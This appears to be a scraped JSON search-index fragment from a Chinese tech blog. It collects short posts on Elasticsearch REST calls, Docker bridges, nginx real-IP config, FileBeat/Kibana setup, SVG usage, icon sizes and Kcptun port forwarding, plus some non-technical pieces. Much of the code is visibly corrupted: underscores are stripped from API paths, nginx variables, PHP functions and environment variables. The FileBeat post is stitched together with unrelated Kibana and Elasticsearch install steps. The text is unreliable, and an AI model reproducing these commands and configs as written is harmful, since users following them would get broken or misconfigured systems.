CSDN下载\n  51CTO下载\n  微盘下载\n  百度云下载\n\n XML教程\n\n在线浏览\n  XML教程\n  DTD教程\n  XML DOM教程\n  XSLT教程\n  XPath教程\n  XQuery教程\n  XLink教程\n  XPointer教程\n  Schema教程\n  XSL-FO教程\n  SVG教程\n  WSDL教程\n  SOAP教程\n  RSS教程\n  RDF教程\nPDF格式\nEPUB格式\nMOBI格式\n\n网站建设教程\n\n在线浏览\n  HTTP 介绍\n  网站建设指南\n  浏览器信息\n  网站主机\n  TCP/IP 协议\n  Web W3C\n  网站品质\n  职业规划\n  网络媒体\nPDF版（2014.11.19）\n  CSDN下载\n  51CTO下载\n  微盘下载\n  百度云下载\n\n w3school教程打包\n\nEPUB格式\n  最后更新：2016.1.11\n  微盘下载\n  千易下载\n\n另见\n\n开发者文档整理计划\n  站点\n  站点源码\n  归档","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/fmt","title":"golang 中fmt用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/fileupload/2016-10-04 golang 正则","title":"文件上传","text":"https://github.com/cmalekpour/watfile","tags":null},{"location":"//blog.pytool.com/Life/2016-03-23 互联网与安全团队需要的几种人才","title":"互联网与安全团队需要的几种人才","text":"这才是互联网与安全团队需要的几种人才！\n每年的这个季节，都是很多团队向往优秀人才的时候，无论是作为公司老板还是团队leader都会有一种无力感，优秀人才的匮乏会渐渐让人感受到脑力上的孤独与无助。跟一群优秀的人才共事是大部分人向往的，而一家优秀企业/团队都应该有一只强大的团队。\n从互联网安全的角度 ，301本次来讨论下互联网安全团队需要什么样的安全人才？\n跟优秀的沟通交流是件非常让人愉悦的事情，特别是跟自己行业领域、思维模式不一样的人才交流收获会更大——这也是301最大获取新知识的途径之一。当然，如果团队拥有思维迥异的人才一起碰撞就可以得到更多创新的成果。\n我们本次就来聊聊几个方面的安全人才。\n第一、实干派人才\n实干派的人才执行力会非常强，遇到任何问题，第一想到的是如何去把事情做好，合理试错，不断反思总结，让事情做得更好。即便事做错了，却能从逆向思维中成长很多，找到对应的解决办法。这样的人才是所有企业/团队都需要的成员/合伙人。因为，只有这样的安全人才才能让更多的想法变成现实。：）\n特点：实干派、执行力强、极具激情。\n\n第二、专注派人才\n专注派安全人才，这群人大部分是『处女座』的同学，他们会对所有的细节方面极度敏感，会全方位覆盖。对细节思考的较多的人更会聚焦在这件事是否可行，是否可以落地，是否可以做得更好上，避免出现低级和不应该犯的错误。专注派人才往往能找到很多细节上的缺失，能让事情做得更完美。301特别佩服在安全领域上从事审计相关的工作的同学，他们往往在细节上考虑得更到位，心思更缜密。\n特点：专注、心思缜密、处女座。\n\n第三、颠覆创新型人才\n颠覆、创新型人才大部分是奋战在一线的同学，这类人群会经常接触真正企业需求，最了解企业需求，不断通过创新的思路去弥补企业安全现状和痛点。同样也会让对方走出自己的思维观点，这种人能让团队带来创新的观点和理念。301非常喜欢这样的人才，这类人才往往不按常理出牌，能在第一时间了解安全市场的需求和机会，也能站在友商的角度去思考问题，让自己团队变得更强。\n特点：不断思考、逆向思维。\n\n第四、梦想模式人才\n一个好的平台和团队会拥有很多梦想型人才，这类人才会有无限的创新想法，虽然会憧憬未来的各种可能性，虽然很多想法即便没办法落地，但是他们的心态会非常乐观。这类安全人才会不断的给团队灌输正能量，让团队的成员更多激情去实现自我价值和团队价值。\n特点：乐观、富有激情。\n\n第五、自我驱动性人才\n这类自我驱动性人才在互联网公司和安全公司相对较少，具备自我驱动能力的人才未来将会是团队leader甚至公司合伙人的角色。这类人才身上会充满激情和活力，能给团队带来巨大动力，让团队能更高效完成工作。虽然会在实现成功的路上会让人觉得无情，但是能绝对让整个团队保持专注。\n特点：管理能力、自我驱动、富有激情、稳重。\n\n如果你是本文提到的人才，请帮忙转发给更多人看。\n如果你还不是本文提到的复合型人才，那更应该提升自己，更应该把转发给更多人看。\n\n最后：只有让自己不断成长，才能让自己负责的事情做得更出色，实现个人价值的同时，最终才让团队走得更远。","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/linux防火墙iptables常用规则","title":"Linux命令 iptables","text":"---\nlinux防火墙iptables常用规则(屏蔽IP地址、禁用ping、协议设置、NAT与转发、负载平衡、自定义链)\n\n新客网 XKER.COM 时间:2012-09-26 00:31:29来源:lesca.me  评论:\n\n条\n\nspan style=\"text-align: left; line-height: 20px; font-family: 'WenQuanYi Micro Hei Mono', 'WenQuanYi Micro Hei', 'Microsoft Yahei Mono', 'Microsoft Yahei', sans-serif; color: rgb(51,51,51); font-size: 15px\"本文介绍25个常用的iptables用法。如果你对iptables还不甚了解，可以参考上一篇/spaniptables详细教程：基础、架构、清空规则、追加规则、应用实例span style=\"text-align: left; line-height: 20px; font-family: 'WenQuanYi Micro Hei Mono', 'WenQuanYi Micro Hei', 'Microsoft Yahei Mono', 'Microsoft Yahei', sans-serif; color: rgb(51,51,51); font-size: 15px\"，看完这篇文章，你就能明白iptables的用法和本文提到的基本术语。/span\n\n \n\n一、iptables：从这里开始","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04 [Elasticsearch]集群管理","title":"Elasticsearch集群管理","text":"Elasticsearch集群管理\n\n   ES通过设置【节点的名字】和【集群的名字】，就能自动的组织相同集群名字的节点加入到集群中，并使很多的技术对用户透明化。\n\n   如果用户想要管理查看集群的状态，可以通过一些REST API来实现。\n\n   其他的ES文档翻译参考：Elasticsearch文档总结\n\nREST API用途\n\nES提供了很多全面的API，大致可以分成如下几种：\n\n1 检查集群、节点、索引的健康情况\n\n2 管理集群、节点，索引数据、元数据\n\n3 执行CRUD，创建、读取、更新、删除 以及 查询\n\n4 执行高级的查询操作，比如分页、排序、脚本、聚合等\n查看集群状态\n\n可以通过CURL命令发送REST命令，查询集群的健康状态：\n\ncurl 'localhost:9200/cat/health?v'\n\nLocalhost是主机的地址，9200是监听的端口号，ES默认监听的端口号就是9200.\n\n这里需要注意的是，windows下安装的CURL有可能不支持单引号，如果有报错，还请改成双引号，内部使用转义字符转义。\n\n得到的相应结果：\n\nepoch      timestamp cluster       status node.total node.data shards pri relo init unassign\n1394735289 14:28:09  elasticsearch green           1         1      0   0    0    0        0\n\n可以看到集群的名字是默认的\"elasticsearch\"，集群的状态时\"green\"。这个颜色之前也有说过：\n\n1 绿色，最健康的状态，代表所有的分片包括备份都可用\n\n2 黄色，基本的分片可用，但是备份不可用（也可能是没有备份）\n\n3 红色，部分的分片可用，表明分片有一部分损坏。此时执行查询部分数据仍然可以查到，遇到这种情况，还是赶快解决比较好。\n\n上面的结果还可以看到，目前有一个节点，但是没有分片，这是因为我们的ES中还没有数据，一次也就没有分片。\n\n当使用elasticsearch作为集群名字时，会使用单播，查询本机上是否还运行着其他的节点。如果有，则组成一个集群。\n\n（如果使用其他的名字作为集群名字，那么就可能采用多播了！这个在工作中，经常会遇到，大家使用的是一个集群名字，分片总是被搞在一起，导致有人的机器下线后，自己的也无法使用）\n\n通过下面的命令，可以查询节点的列表：\n\ncurl 'localhost:9200/cat/nodes?v'\n\n得到的结果如下：\n\ncurl 'localhost:9200/cat/nodes?v'\nhost         ip        heap.percent ram.percent load node.role master name\nmwubuntu1    127.0.1.1            8           4 0.00 d         *      New Goblin\n\n查看所有的索引\n\n在ES中索引有两个意思：\n\n1 动词的索引，表示把数据存储到ES中，提供搜索的过程；这期间可能正在执行一个创建搜索的过程。\n\n2 名字的索引，它是ES中的一个存储类型，与数据库类似，内部包含type字段，type中包含各种文档。\n\n通过下面的命令可以查看所有的索引：\n\ncurl 'localhost:9200/cat/indices?v'\n\n得到的结果如下：\n\ncurl 'localhost:9200/cat/indices?v'\nhealth index pri rep docs.count docs.deleted store.size pri.store.size\n\n由于集群中没有任何的数据，上面的结果中也就只包含列的信息了。\n创建索引\n\n下面是创建索引，以及查询索引的例子：\n复制代码\n\ncurl -XPUT 'localhost:9200/customer?pretty'\n{\n \"acknowledged\" : true\n}\n\ncurl 'localhost:9200/cat/indices?v'\nhealth index    pri rep docs.count docs.deleted store.size pri.store.size\nyellow customer   5   1          0            0       495b           495b\n\n复制代码\n\n上面的结果中，customer索引的状态是yellow,这是因为此时虽然有5个主分片和一个备份。但是由于只是单个节点，我们的分片还在运行中，无法动态的修改。因此当有其他的节点加入到集群中，备份的节点会被拷贝到另一个节点中，状态就会变成green。\n索引和搜索文档\n\n之前说过，索引里面还有类型的概念，在索引文档之前要先设置类型type。\n\n执行的命令如下：\n\ncurl -XPUT 'localhost:9200/customer/external/1?pretty' -d '\n{\n \"name\": \"John Doe\"\n}'\n\n执行成功后会得到如下的信息：\n复制代码\n\n{\n \"index\" : \"customer\",\n \"type\" : \"external\",\n \"id\" : \"1\",\n \"version\" : 1,\n \"created\" : true\n}\n\n复制代码\n\n注意2.0版本的ES在同一索引下，不同的类型，相同的字段名字，是不允许字段类型不一致的。\n\n上面的例子中，为我们创建了一个文档，并且id自动设置为1.\n\nES不需要再索引文档前，不需要明确的创建索引，如果执行上面的命令，索引不存在，也会自动的创建索引。\n\n执行下面的命令查询，返回信息也如下：\n复制代码\n\ncurl -XGET 'localhost:9200/customer/external/1?pretty'\n{\n \"index\" : \"customer\",\n \"type\" : \"external\",\n \"id\" : \"1\",\n \"version\" : 1,\n \"found\" : true, \"source\" : { \"name\": \"John Doe\" }\n}\n\n复制代码\n\n这里会新增两个字段：\n\n1 found 描述了请求信息\n\n2 source 为之前索引时的数据\n删除索引\n\n执行下面的命令就可以删除索引：\n\ncurl -XDELETE 'localhost:9200/customer?pretty'\n\n返回结果：\n\n{\n   \"acknowledged\": true\n}\n\n总结\n\n总结上面涉及到的命令大致如下：\n复制代码\n\ncurl -XPUT 'localhost:9200/customer'//创建索引\n//插入数据\ncurl -XPUT 'localhost:9200/customer/external/1'-d '\n{\n \"name\": \"John Doe\"\n}'\ncurl 'localhost:9200/customer/external/1'//查询数据\ncurl -XDELETE 'localhost:9200/customer'//删除索引\n\n复制代码\n参考\n\n1【Elasticsearch官方文档】：https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html","tags":null},{"location":"//blog.pytool.com/Post/docker/2016-01-02 Linux命令 Docker网桥","title":"Linux命令 Docker","text":"---\n Docker：添加自定义网桥\n\n Docker服务进程在启动的时候会生成一个名为docker0的网桥，容器默认都会挂载到该网桥下，但是我们可以通过添加docker启动参数-b Birdge 或更改docker配置文件来选择使用哪个网桥。\n\n操作系统：centos7\n\n删除docker0网桥\n\n[html] view plain copy\nservice docker stop //关闭docker服务  \nip link set dev docker0 down //关闭docker0网桥   \nip link del dev docker0       //删除docker0网桥  \n自定义网桥设置（/etc/sysconfig/network-scripts/ifcfg-br0文件）\n[html] view plain copy\nDEVICE=\"br0\"  \nONBOOT=\"yes\"  \nTYPE=\"Bridge\"  \nBOOTPROTO=\"static\"  \nIPADDR=\"10.10.10.20\"  \nNETMASK=\"255.255.255.0\"  \nGATEWAY=\"10.10.10.20\"  \nDEFROUTE=\"yes\"  \nNMCONTROLLED=\"no\"  \n重启网络服务\n\n[html] view plain copy\nservice network restart  \n查看网桥\n\n[html] view plain copy\n[black@test opt]$ brctl show  \nbridge name     bridge id               STP enabled     interfaces  \nbr0             8000.32e7297502be       no                \nvirbr0          8000.000000000000       yes  \n接下来我们需要重新启动docker，可以在启动docker服务进程时使用以下两种方式：\n\n第一种：-b 参数指定网桥\n\n[html] view plain copy\n[root@test opt]# docker -d -b br0  \nINFO[0000] Listening for HTTP on unix (/var/run/docker.sock)   \nINFO[0000] [graphdriver] using prior storage driver \"devicemapper\"   \nWARN[0000] Running modprobe bridge nfnat failed with message: , error: exit status 1   \nINFO[0000] Loading containers: start.                     \n......  \nINFO[0000] Loading containers: done.                      \nINFO[0000] Daemon has completed initialization            \nINFO[0000] Docker daemon      commit=786b29d execdriver=native-0.2 graphdriver=devicemapper version=1.7.1  \n不知道为什么这样启动docker 服务进程会阻塞当前终端(︶︿︶)，只好重新开一个终端，然后运行一个容器\n\n[html] view plain copy\n[root@test shell]# docker run -ti --rm centos:latest  \n[root@3c6874559411 /]# ifconfig  \neth0      Link encap:Ethernet  HWaddr 02:42:0A:0A:0A:01    \n        inet addr:10.10.10.1  Bcast:0.0.0.0  Mask:255.255.255.0  \n        inet6 addr: fe80::42:aff:fe0a:a01/64 Scope:Link  \n        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1  \n        RX packets:5 errors:0 dropped:0 overruns:0 frame:0  \n        TX packets:6 errors:0 dropped:0 overruns:0 carrier:0  \n        collisions:0 txqueuelen:0   \n        RX bytes:418 (418.0 b)  TX bytes:508 (508.0 b)  \n容器成功使用br0网桥。\n\n第二种：修改/etc/sysconfig/docker文件\n我在进行这种操作的时候遇到了一点问题，我修改了/etc/sysconfig/docker文件\n\n[html] view plain copy\n[root@test opt]# vi /etc/sysconfig/docker   \n/etc/sysconfig/docker  \n  \nOther arguments to pass to the docker daemon process  \n These will be parsed by the sysv initscript and appended  \nto the arguments list passed to docker -d  \n\notherargs=\"-b br0\"  \n接着使用service docker start启动docker服务，但是otherargs并不生效，在centos7下servicer docker start仍然会采用systemctl start docker.service命令来运行，于是我就打开/usr/lib/systemd/system/docker.service查看\n\n[html] view plain copy\n[root@test opt] vi /lib/systemd/system/docker.service   \n[Unit]  \nDescription=Docker Application Container Engine  \nDocumentation=https://docs.docker.com  \nAfter=network.target docker.socket  \nRequires=docker.socket  \n[Service]  \nExecStart=/usr/bin/docker -d  -H fd://  \nMountFlags=slave  \nLimitNOFILE=1048576  \nLimitNPROC=1048576  \nLimitCORE=infinity  \n\n[Install]  \nWantedBy=multi-user.target  \n发现ExecStart一项并没有运行参数，于是将ExecStart改为/usr/bin/docker -d -b br0 -H fd://，运行docker服务，启动一个容器发现能够成功使用br0网桥。","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx 返回目标ip","title":"Linux命令 Nginx列出目录 autoindex","text":"location  /ip {\n  # 默认是文件格式\n  addheader  Content-Type 'text/html; charset=utf-8';\n\n  set $realip $remoteaddr;\n  if ($httpxforwardedfor ~ \"^(\\d+\\.\\d+\\.\\d+\\.\\d+)\") {\n    set $realip $1;\n  }\n\n  return 200 \"$realip\";\n}\n\n获取用户真实IP，并赋值给变量$clientRealIP\nmap $httpxforwardedfor  $clientRealIp {\n        \"\"      $remote_addr;\n        ~^(?PfirstAddr[0-9\\.]+),?.*$  $firstAddr;\n}\n`","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elastic 部署日志","title":"FileBeat5.2.2安装部署记录","text":"---\nFileBeat5.2.2安装部署记录\n\n 1.简介\nBeats包含众多的套件，如FileBeat、HeatBeat等。\nFileBeat设计以可靠性与低延迟出发，是一个资源友好型的agent服务，非常适合抓取服务端的日志文件。\n\n2.安装\n可以通过rpm进行安装\ncurl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-5.2.2-x8664.rpm\nsudo rpm -vi filebeat-5.2.2-x8664.rpm\n\n 3.配置\nvim /etc/filebeat/filebeat.yml\n定义日志文件路径\nfilebeat.prospectors:\ninputtype: log\n  paths:\n    /var/log/.log\n.log说明filebeat会抓取所有/var/log下的.log日志文件\n定义beat的output为ES\nhosts: [\"192.168.1.42:9200\"]\n\n3. 配置\n 指定服务端的端口号\nserver.port: 5601\n\n 指定host地址，默认为\"localhost\"，当需要外部访问时，设置一个非回显地址.\nserver.host: \"localhost\"\n\n 用于当配置代理时指定一个路径，会影响kibana访问的URL地址，不能以/结尾.\nserver.basePath: \"\"\n\n 来自服务端请求的最大负载(字节).\nserver.maxPayloadBytes: 1048576\n\n Kibana服务的名称.\nserver.name: \"your-hostname\"\n\n Kibana默认的主页地址.\nserver.defaultRoute: \"/app/kibana\"\n\n ES服务地址.\nelasticsearch.url: \"http://120.92.36.21:9200\"\n\n 设置为true时，kibana使用server.host中的配置；设置为false时，kibana使用hostname访问。\nelasticsearch.preserveHost: true\n\n Kibana在ES中保存搜索条件、可视化设置、仪表盘等信息.\nkibana.index: \".kibana\"\n\n 默认加载的应用.\nkibana.defaultAppId: \"discover\"\n\n 如果ES端设置有基础的权限访问控制,kibana端则使用这个用户名/密码去访问ES。kibana的用户需要由ES的访问权限。\nelasticsearch.username: \"user\"\nelasticsearch.password: \"pass\"\nPaths to the PEM-format SSL certificate and SSL key files, respectively. These\n files enable SSL for outgoing requests from the Kibana server to the browser.\nserver.ssl.cert: /path/to/your/server.crt\nserver.ssl.key: /path/to/your/server.key\n\nOptional settings that provide the paths to the PEM-format SSL certificate and key files.\n These files validate that your Elasticsearch backend uses the same key files.\nelasticsearch.ssl.cert: /path/to/your/client.crt\nelasticsearch.ssl.key: /path/to/your/client.key\n\nOptional setting that enables you to specify a path to the PEM file for the certificate\n authority for your Elasticsearch instance.\nelasticsearch.ssl.ca: /path/to/your/CA.pem\n\n To disregard the validity of SSL certificates, change this setting's value to false.\nelasticsearch.ssl.verify: true\n\n Time in milliseconds to wait for Elasticsearch to respond to pings. Defaults to the value of\nthe elasticsearch.requestTimeout setting.\nelasticsearch.pingTimeout: 1500\n\nTime in milliseconds to wait for responses from the back end or Elasticsearch. This value\n must be a positive integer.\nelasticsearch.requestTimeout: 30000\n\n List of Kibana client-side headers to send to Elasticsearch. To send no* client-side\nheaders, set this value to [] (an empty list).\nelasticsearch.requestHeadersWhitelist: [ authorization ]\n\nHeader names and values that are sent to Elasticsearch. Any custom headers cannot be overwritten\n by client-side headers, regardless of the elasticsearch.requestHeadersWhitelist configuration.\nelasticsearch.customHeaders: {}\n\n Time in milliseconds for Elasticsearch to wait for responses from shards. Set to 0 to disable.\nelasticsearch.shardTimeout: 0\n\n Time in milliseconds to wait for Elasticsearch at Kibana startup before retrying.\nelasticsearch.startupTimeout: 5000\n\n 指定kibana pid路径.\npid.file: /var/run/kibana.pid\n\n kibana log路径.\nlogging.dest: stdout\n\n 设置true阻止kibana打印日志.\nlogging.silent: false\n\n 设置为true,kibana只打印error日志.\nlogging.quiet: false\n\n 设置为true,kibana记录所有事件，包括系统使用信息与所有请求信息.\nlogging.verbose: false\n\n 设置系统的性能监控周期，最小100ms，默认5000ms.\nops.interval: 5000\n\n 4. 启动ES\n\n5. 生产环境下的使用\nSSH\n通过ES节点进行访问负载均衡\n可以利用es的负载均衡特性来部署kibana，把es节点设置为协调节点：\n把kibana与es部署在同一个节点\n设置es节点为\nnode.master: false\nnode.data: false\nnode.ingest: false\n设置es节点加入es集群\ncluster.name: \"currentcluster\"\n设置network.host与transport.host\nnetwork.host设置为kibana可以访问的地址，默认为localhost\ntransport.host设置为节点可以连接es集群的地址\n设置kibana可以访问到当前es\nelasticsearch.url: \"http://120.92.36.21:9200\"\n\n切换到root账户\n$ su root\n$ rpm -e jdk (之前安装的jdk)\n$ rpm -ivh jdk-8u121-linux-x64.rpm (安装)\n\n可以选择更新安装包\n$ rpm -Uvh jdk-8u121-linux-x64.rpm (更新)\n\n设置环境变量\n$ vim /etc/profile\n\n添加如下内容\nexport JAVAHOME=/usr/java/jdk1.8.0121\nexport CLASSPATH=.:$JAVAHOME/lib/dt.jar:$JAVAHOME/lib/tools.jar\nexport PATH=$PATH:$JAVA_HOME/bin\n\n立即生效\nsource /etc/profile\n注意: ES的默认是运行在64位的JVM之上的，如果当前环境是32的JVM，那么需要把jvm.options中的-server移除掉，并且把线程堆栈大小-Xss1m调整为-Xss320k。\n\n2. ES安装\n解压tar.gz包\n$ tar -zxvf elasticsearch-5.2.2.tar.gz\n\n 3. ES配置\nES5.2.2中配置文件包括：elasticsearch.yaml、log4j2.properties、jvm.options、scripts四个配置文件。\n\nelasticsearch.yaml为ES的配置\n","tags":null},{"location":"//blog.pytool.com/Life/2016-03-23 猎头的艺术","title":"中国经济真相","text":"猎头:\"亲，最近想不想看看机会？\"\ncandidate: \"暂时不考虑...\"\n猎：“那有没有讨厌打领导想让他走的？”\nC：”。。。”\n猎：“有没有绩效比你好，影响你加薪升职打同事？你说，告诉我电话，我必定拔刀相助！！！”\nC：”“。。。”\n猎：‘有没有技术比你好，抢你打女神打注意力的？大胆说出来，我都低调帮你干掉。。。’","tags":null},{"location":"//blog.pytool.com/Reship/2015-05-20-using-svg","title":"使用 SVG","text":"为什么使用SVG\n\n体积小\n缩放不失真(除非非常小)\n在retina显示很好\n\n 制作SVG\n\nAdobe illustrator\n\n以img方式使用SVG\n\n例如：\n\nimg src=\"kiwi.svg\" alt=\"Kiwi standing on oval\"\n 浏览器支持\n参见：http://caniuse.com/#feat=svg-img\n\n基本上除了IE 8及其以下，和Android 2.3及其以下都支持。\n\n兼容方案一：\n\nif (!Modernizr.svg) {\n  $(\".logo img\").attr(\"src\", \"images/logo.png\");\n}\n\n兼容方案二：\n\nimg src=\"image.svg\" onerror=\"this.onerror=null; this.src='image.png'\"\n\n以background-image方式使用SVG\n\n例如：\n\na href=\"/\" class=\"logo\"\n  Kiwi Corp\n/a\n\ncss:\n\n.logo {\n  display: block;\n  text-indent: -9999px;\n  width: 100px;\n  height: 82px;\n  background: url(kiwi.svg);\n  background-size: 100px 82px;\n}\n\n 浏览器支持\n\n参见:http://caniuse.com/#feat=svg-css\n\n基本上和使用img标签一致：除了IE 8及其以下，和Android 2.3及其以下都支持。\n\n兼容方案一：Modernizr\n\n.main-header {\n  background: url(logo.svg) no-repeat top left;\n  background-size: contain;\n}\n\n.no-svg .main-header {\n  background-image: url(logo.png);\n}\n\n这样会比使用img标签少一次HTTP请求。\n\n兼容方案二：\n\nbody {\n  background: url(fallback.png);\n  background-image: url(image.svg), none;\n}\n\n这是因为浏览器对SVG的支持程度和对多背景的支持程度类似。所以如果浏览器支持多背景图，基本上就支持SVG，第二条css规则就生效，从而覆盖第一条。\n\n问题是\n使用上面个两种方式的缺点在于不能用CSS控制SVG的内部结构。用下面的方式就可以：\n\n 使用\"inline\" SVG\n\nbody\n\n   !-- paste in SVG code, image shows up!  --\n\n/body\n\n这样就不用发起额外的HTTP请求。和使用Data URI的优点一样，当然缺点也一样。\n\n还可以利用后端语言进行插入：\n\n?php echo filegetcontents(\"kiwi.svg\"); ?\n\n使用PHP时，要使用filegetcontents() ,而不能用include() 和 includeonce()。because SVG sometimes is exported with ?xml version=\"1.0\" encoding=\"UTF-8\"? that as the opening line, which will cause the PHP parser to choke on it.\n\n优化SVG文件\n\nhttp://petercollingridge.appspot.com/svgoptimiser\nhttps://github.com/svg/svgo\n\n 用CSS进行控制\n\n可以像编辑HTML标签那样编辑SVG标签，例如：\n\nsvg ...\n  ellipse class=\"ground\" .../\n  path class=\"kiwi\" .../\n/svg\n\nSVG 元素有独立的CSS属性集。例如：不是background-color而是 fill。\n\n.kiwi {\n  fill: #94d31b; \n}\n.kiwi:hover {\n  fill: #ace63c; \n}\n\nsvg 可以使用filter \n\nsvg ...\n  ...\n  filter id=\"pictureFilter\" \n    feGaussianBlur stdDeviation=\"5\" /\n  /filter \n/svg\n\n.ground:hover {\n  filter: url(#pictureFilter);\n}\n\n浏览器支持\n参见http://caniuse.com/feat=svg-html5\n\n基本上也是：除了IE 8及其以下，和Android 2.3及其以下都支持。\n\n兼容方案：利用Modernizr\n\nsvg ... /svg\ndiv class=\"fallback\"/div\n\n.fallback { \n  display: none;\n  / Make sure it's the same size as the SVG takes up /\n}\n.no-svg .fallback { \n  background-image: url(logo.png); \n}\n\n以object形式使用SVG\n\nobject type=\"image/svg+xml\" data=\"kiwi.svg\" class=\"logo\"\n  Kiwi Logo !-- fallback image in CSS --\n/object\n\n兼容方案，还是使用Modernizr：\n\n.no-svg .logo {\n  width: 200px;\n  height: 164px;\n  background-image: url(kiwi.png);\n}\n\n如果要使用CSS，则不能直接在HTML中应用外部样式表，或是内联样式表。需要将style写到SVG文件中。\n\nsvg ...\n  style\n    / SVG specific fancy CSS styling here /\n  /style\n  ...\n/svg\n\n如果需要引用外部样式表，则需要在SVG文件中，svg标签之上加入下面代码：\n\n?xml-stylesheet type=\"text/css\" href=\"svg.css\" ?\n\n以这种方式引入的样式对于用img 或是background-image 方式引入的SVG文件不起作用。\n 以Data URI 形式使用SVG\n\n在线转换工具：http://www.mobilefish.com/services/base64/base64.php\n\n可以用转换后的结果替换下面的[data]：\n\n在img标签：\n\nimg src=\"data:image/svg+xml;base64,[data]\"\n\n在CSS中：\n\n.logo {\n  background: url(\"data:image/svg+xml;base64,[data]\");\n}\n\n在object标签：\n\nobject type=\"image/svg+xml\" data=\"data:image/svg+xml;base64,[data]\"\n  fallback\n/object\n\n如果在转换之前，在SVG中引入了style，那么如果使用object方式使用base64结果，同样会起作用。\n\nData URI 的格式\n\nData URI不一定是base64格式。对于SVG来说，可能最好不要用base64格式\n\nPrimarily because the native format of SVG is much more repetitive than base64 ends up, it gzips better.\n\n!-- base64 --\ndata:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL...\n\n!-- UTF-8, not encoded --\ndata:image/svg+xml;charset=UTF-8,svg ... ... /svg\n\n!-- UTF-8, optimized encoding for compatibility --\ndata:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://...'\n\n!-- Fully URL encoded ASCII --\ndata:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A//...\n\n通过命令行进行base64编码\n\n原文地址：https://css-tricks.com/using-svg/","tags":null},{"location":"//blog.pytool.com/Other/2010-01-01 常见尺寸规范","title":"常见尺寸规范","text":"favicon.ico\n 尺寸: 32x32  常用:1616 3232 4848 6464 128128\n\n 会员卡\n  PVC卡 身份证\n      外：88.5:57\n      内尺寸 长 85.5mm   宽度 54 mm\n      磁条： 宽度 12.5mm 高度 37.5 mm\n\n将APP内置的图标替换为高清图标\n为了提升用户安装后的视觉体验，请您将APP内置的图标替换为高清图标，以便在vivo手机安装APP后显示清晰美观的应用图标。\n请于APK内部图标路径替换相应图标，具体每个文件夹中对应的图标尺寸规范如下（原则是不低于规范尺寸,单位：px）：\n\nhdpi文件夹 —— 192x192\nxhdpi文件夹 —— 256x256\nxxhdpi文件夹 —— 384x384\nxxxhdpi文件夹 —— 512x512\n\n注：分辨率适配目录参考\n\n480800    drawable-hdpi\n540960    drawable-sw360dp-hdpi\n7201280   drawable-sw360dp-xhdpi\n10801920  drawable-sw360dp-xxhdpi\n14402560  drawable-sw360dp-xxxhdpi","tags":null},{"location":"//blog.pytool.com/Hacker/00_端口转发(隧道)/2015-01-29 Kcptun","title":"Kcptun","text":"KCP 协议：https://github.com/skywind3000/kcp\nKcptun 项目地址：https://github.com/xtaci/kcptun\nKcp-server：https://github.com/clangcn/kcp-server\n\n快速设定\n\n客户端、服务器分别下载对应平台的二进制压缩包，并解压，通过下面的命令启动端口转发。\n服务器: ./serverlinuxamd64 -t \"服务器IP地址:8388\" -l \":4000\" -mode fast2\n客户端: ./clientdarwinamd64 -r \"服务器IP地址:4000\" -l \":8388\" -mode fast2\n以上命令可以实现8388/tcp端口的转发（通过4000/udp端口）。\n\n 速度对比\n\nimg src=\"fast.png\" alt=\"fast.com\" height=\"256px\" /       \n测速网站: https://fast.com\n接入速度: 100Mbps\nWIFI: 5GHz TL-WDR3320\n\n使用方法\n\n在Mac OS X El Capitan下的帮助输出，注意默认值:\n$ ./clientdarwinamd64 -h\nNAME:\n   kcptun - client(with SMUX)\n\nUSAGE:\n   clientdarwinamd64 [global options] command [command options] [arguments...]\n\nVERSION:\n   20161025\n\nCOMMANDS:\n     help, h  Shows a list of commands or help for one command\n\nGLOBAL OPTIONS:\n   --localaddr value, -l value   local listen address (default: \":12948\")\n   --remoteaddr value, -r value  kcp server address (default: \"vps:29900\")\n   --key value                   pre-shared secret between client and server (default: \"it's a secrect\") [$KCPTUNKEY]\n   --crypt value                 aes, aes-128, aes-192, salsa20, blowfish, twofish, cast5, 3des, tea, xtea, xor, none (default: \"aes\")\n   --mode value                  profiles: fast3, fast2, fast, normal (default: \"fast\")\n   --conn value                  set num of UDP connections to server (default: 1)\n   --autoexpire value            set auto expiration time(in seconds) for a single UDP connection, 0 to disable (default: 0)\n   --mtu value                   set maximum transmission unit for UDP packets (default: 1350)\n   --sndwnd value                set send window size(num of packets) (default: 128)\n   --rcvwnd value                set receive window size(num of packets) (default: 1024)\n   --datashard value             set reed-solomon erasure coding - datashard (default: 10)\n   --parityshard value           set reed-solomon erasure coding - parityshard (default: 3)\n   --dscp value                  set DSCP(6bit) (default: 0)\n   --nocomp                      disable compression\n   --log value                   specify a log file to output, default goes to stderr\n   -c value                      config from json file, which will override the command from shell\n   --help, -h                    show help\n   --version, -v                 print the version\n\n$ ./serverdarwinamd64 -h\nNAME:\n   kcptun - server(with SMUX)\n\nUSAGE:\n   serverdarwinamd64 [global options] command [command options] [arguments...]\n\nVERSION:\n   20161025\n\nCOMMANDS:\n     help, h  Shows a list of commands or help for one command\n\nGLOBAL OPTIONS:\n   --listen value, -l value  kcp server listen address (default: \":29900\")\n   --target value, -t value  target server address (default: \"127.0.0.1:12948\")\n   --key value               pre-shared secret between client and server (default: \"it's a secrect\") [$KCPTUNKEY]\n   --crypt value             aes, aes-128, aes-192, salsa20, blowfish, twofish, cast5, 3des, tea, xtea, xor, none (default: \"aes\")\n   --mode value              profiles: fast3, fast2, fast, normal (default: \"fast\")\n   --mtu value               set maximum transmission unit for UDP packets (default: 1350)\n   --sndwnd value            set send window size(num of packets) (default: 1024)\n   --rcvwnd value            set receive window size(num of packets) (default: 1024)\n   --datashard value         set reed-solomon erasure coding - datashard (default: 10)\n   --parityshard value       set reed-solomon erasure coding - parityshard (default: 3)\n   --dscp value              set DSCP(6bit) (default: 0)\n   --nocomp                  disable compression\n   --log value               specify a log file to output, default goes to stderr\n   -c value                  config from json file, which will override the command from shell\n   --help, -h                show help\n   --version, -v             print the version\n 分层参数图\n\np align=\"left\"img src=\"layeredparams.png\" 